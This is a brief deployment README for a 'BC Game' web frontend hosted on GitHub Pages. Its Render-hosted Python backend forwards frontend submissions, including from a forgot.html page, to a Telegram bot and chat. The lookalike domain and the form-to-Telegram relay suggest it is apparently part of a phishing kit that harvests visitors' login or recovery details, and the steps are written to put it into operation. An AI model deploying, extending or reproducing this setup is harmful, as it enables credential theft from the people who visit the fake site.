BC Game frontend is served from GitHub Pages.

To keep Telegram forwarding live all the time, deploy backend_server.py to an always-on host such as Render.

Render deployment

1. Push this folder to GitHub.
2. In Render, create a new Blueprint or Web Service from the repository.
3. Render will read render.yaml automatically.
4. Add these environment variables in Render:
	TELEGRAM_BOT_TOKEN = your real bot token
	TELEGRAM_CHAT_ID = your real chat id
	ALLOWED_ORIGIN = https://bcgame67.com
5. Deploy the service.
6. After deployment, copy the Render backend URL ending with /api/telegram.
7. Update BACKEND_ENDPOINT in script.js and forgot.html to that permanent HTTPS URL.

Health check

GET /health

Telegram API endpoint used by frontend

POST /api/telegram

Local run

Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in your environment, then run:

python backend_server.py
